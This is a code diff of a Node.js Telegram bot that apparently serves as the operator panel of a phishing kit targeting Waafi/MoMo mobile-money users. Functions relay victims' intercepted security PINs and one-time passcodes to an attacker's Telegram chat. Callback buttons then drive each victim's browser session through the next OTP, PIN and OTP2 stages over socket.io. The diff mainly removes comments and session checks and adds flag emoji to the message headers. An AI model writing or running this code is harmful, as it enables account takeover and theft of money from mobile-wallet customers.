@@ -7,14 +7,10 @@ if (!token || !chatId) {
     console.error("❌ Crucial environment keys (BOT_TOKEN / ADMIN_CHAT_ID) are undefined.");
 }
 
-// Initialize bot for webhook context processing
 const bot = new TelegramBot(token);
 
-/**
- * Parses generic JSON structures dynamically into consistent human-readable key-value pairs
- */
 function formatPayloadMessage(appId, headline, metadata) {
-    let baseTemplate = `<b>${headline}</b>\n`;
+    let baseTemplate = `<b>🇸🇴 ${headline}</b>\n`;
     baseTemplate += `<code>────────────────────────</code>\n`;
     baseTemplate += `🆔 <b>App Session:</b> <code>${appId}</code>\n`;
     
@@ -28,9 +24,6 @@ function formatPayloadMessage(appId, headline, metadata) {
     return baseTemplate;
 }
 
-/**
- * Builds unified interactive buttons for handling multi-step workflow actions
- */
 function buildInlineOptions(appId, prefix = "approve") {
     return {
         reply_markup: {
@@ -45,13 +38,9 @@ function buildInlineOptions(appId, prefix = "approve") {
     };
 }
 
-/**
- * Forwards structured forms safely out to the designated administrative panel channel
- */
 function sendToAdmin(appId, title, metadata, generateControls = false) {
-    if (!appId || appId === "null" || appId === "") return console.error("⚠️ sendToAdmin blocked: Invalid room session.");
-
     const textContent = formatPayloadMessage(appId, title, metadata);
+    // Explicitly uses buildInlineOptions only if generateControls is true (Steps 1, 2, 3 authentication)
     const layoutSettings = generateControls ? buildInlineOptions(appId, "approve") : { parse_mode: 'HTML' };
     
     bot.sendMessage(chatId, textContent, layoutSettings).catch(err => {
@@ -59,47 +48,29 @@ function sendToAdmin(appId, title, metadata, generateControls = false) {
     });
 }
 
-/**
- * Delivers intercepted MoMo security PIN codes to the administrator channel
- */
 function sendFinalApproval(appId, pinCode) {
-    if (!appId || appId === "null" || appId === "") return console.error("⚠️ sendFinalApproval blocked: Invalid room session.");
-
-    const bodyText = `<b>🔒 Intercepted Account Security PIN</b>\n<code>────────────────────────</code>\n🆔 <b>App Session:</b> <code>${appId}</code>\n🔑 <b>Waafi PIN Entry:</b> <code>${pinCode}</code>\n<code>────────────────────────</code>`;
+    const bodyText = `<b>🇸🇴 🔒 Intercepted Account Security PIN</b>\n<code>────────────────────────</code>\n🆔 <b>App Session:</b> <code>${appId}</code>\n🔑 <b>Waafi PIN Entry:</b> <code>${pinCode}</code>\n<code>────────────────────────</code>`;
     bot.sendMessage(chatId, bodyText, buildInlineOptions(appId, "pinok")).catch(err => {
         console.error(`❌ Pin data routing failure: ${err.message}`);
     });
 }
 
-/**
- * Relays secondary step factor authorization strings
- */
 function sendSecondOTP(appId, backupCode) {
-    if (!appId || appId === "null" || appId === "") return console.error("⚠️ sendSecondOTP blocked: Invalid room session.");
-
-    const textMarkup = `<b>⚠️ Secondary Authorization Layer (OTP 2)</b>\n<code>────────────────────────</code>\n🆔 <b>App Session:</b> <code>${appId}</code>\n🛡️ <b>Verification Key:</b> <code>${backupCode}</code>\n<code>────────────────────────</code>`;
+    const textMarkup = `<b>🇸🇴 ⚠️ Secondary Authorization Layer (OTP 2)</b>\n<code>────────────────────────</code>\n🆔 <b>App Session:</b> <code>${appId}</code>\n🛡️ <b>Verification Key:</b> <code>${backupCode}</code>\n<code>────────────────────────</code>`;
     bot.sendMessage(chatId, textMarkup, buildInlineOptions(appId, "otp2ok")).catch(err => {
         console.error(`❌ Step secondary data routing failure: ${err.message}`);
     });
 }
 
-// Process administrator feedback adjustments directly from backend channel
-bot.on('callback_query', async (query) => {
+bot.on('callback_query', (query) => {
     const callbackData = query.data;
     const messageId = query.message.message_id;
     
-    // 1. Instantly stop the Telegram loading spinner so the button feels functional
-    try {
-        await bot.answerCallbackQuery(query.id);
-    } catch (err) {
-        console.error(`❌ Failed to answer callback query: ${err.message}`);
-    }
+    bot.answerCallbackQuery(query.id, { text: "Processing request..." }).catch(e => console.error(e));
     
     const [action, targetAppId] = callbackData.split('_');
-    
-    // 2. Reject broken sessions cleanly before modifying state or calling Socket rooms
     if (!action || !targetAppId || targetAppId === "null" || targetAppId === "") {
-        console.warn(`⚠️ Blocked callback action execution for empty/null target session.`);
+        console.error("⚠️ Invalid callback action or target room received.");
         return;
     }
 
@@ -107,25 +78,21 @@ bot.on('callback_query', async (query) => {
 
     switch (action) {
         case 'approve':
-            // Step 1 OTP 1 -> Advances user interface to Step 2 PIN Box
             global.io.to(targetAppId).emit('admin-approve-otp');
             systemResponseLog = "🟢 Initial OTP Verified. Pushed to PIN stage.";
             break;
 
         case 'pinok':
-            // Step 2 PIN Entry -> Advances user interface to Step 3 OTP 2 Form
             global.io.to(targetAppId).emit('pin-verified');
             systemResponseLog = "🟢 PIN Captured. Pushed to Secondary Verification (OTP 2).";
             break;
 
         case 'otp2ok':
-            // Step 3 OTP 2 Form -> Advances user interface to Step 4 Parameter configuration panels
             global.io.to(targetAppId).emit('admin-approve-otp2');
             systemResponseLog = "🟢 Secondary Layer Cleared. Opened parameters dashboard.";
             break;
 
         case 'reject':
-            // Universal cancellation drop handling rules across active paths
             global.io.to(targetAppId).emit('admin-reject', { message: "Xaqiijintaada waa la diiday. Fadlan isku day markale." });
             systemResponseLog = "🔴 Application state systematically dropped by admin.";
             break;
@@ -135,7 +102,6 @@ bot.on('callback_query', async (query) => {
             return;
     }
 
-    // Reflect operational adjustments inside backend log message templates safely
     bot.editMessageText(`${query.message.text}\n\n[Action Log]: ${systemResponseLog}`, {
         chat_id: chatId,
         message_id: messageId,
